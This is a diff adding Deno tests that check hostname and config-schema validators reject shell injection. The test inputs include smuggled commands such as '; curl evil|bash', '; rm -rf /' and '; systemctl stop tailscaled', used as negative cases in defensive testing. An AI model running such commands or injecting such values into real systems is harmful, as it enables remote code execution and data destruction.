@@ -1,5 +1,6 @@
 import { assertEquals, assertStringIncludes, assertThrows } from "@std/assert";
 import {
+  assertHostname,
   assertTailnetAuthKey,
   buildEnsureAccessTokenCmd,
   buildEnsureWorkerTokenCmd,
@@ -204,4 +205,55 @@ Deno.test("assertTailnetAuthKey accepts tskey, rejects injection", () => {
   assertThrows(() => assertTailnetAuthKey("tskey-auth-k1$(whoami)"));
   assertThrows(() => assertTailnetAuthKey("not-a-key"));
   assertThrows(() => assertTailnetAuthKey(undefined));
+});
+
+Deno.test("assertHostname accepts a MagicDNS name, rejects injection", () => {
+  assertEquals(
+    assertHostname("swamp-serve.tailnet.ts.net", "magicDnsName"),
+    "swamp-serve.tailnet.ts.net",
+  );
+  assertThrows(() =>
+    assertHostname("evil.ts.net; systemctl stop tailscaled", "magicDnsName")
+  );
+  assertThrows(() => assertHostname("has space.ts.net", "magicDnsName"));
+});
+
+Deno.test("datastoreType and metachar fields reject shell injection", () => {
+  const schema = model.globalArguments;
+  const base = { adminPrincipal: "user:a", tokenVault: "v" };
+  // datastoreType with a command separator must be rejected.
+  assertEquals(
+    schema.safeParse({
+      ...base,
+      datastoreConfig: "{}",
+      datastoreType: "@swamp/s3-datastore; curl evil|bash",
+    }).success,
+    false,
+  );
+  // A legitimate extension name validates.
+  assertEquals(
+    schema.safeParse({
+      ...base,
+      datastoreConfig: "{}",
+      datastoreType: "@swamp/gcs-datastore",
+    }).success,
+    true,
+  );
+  // magicDnsName and clubApiKeyPath with metacharacters are rejected.
+  assertEquals(
+    schema.safeParse({
+      ...base,
+      datastoreConfig: "{}",
+      magicDnsName: "evil.ts.net; rm -rf /",
+    }).success,
+    false,
+  );
+  assertEquals(
+    schema.safeParse({
+      ...base,
+      datastoreConfig: "{}",
+      clubApiKeyPath: "/tmp/key; curl evil",
+    }).success,
+    false,
+  );
 });
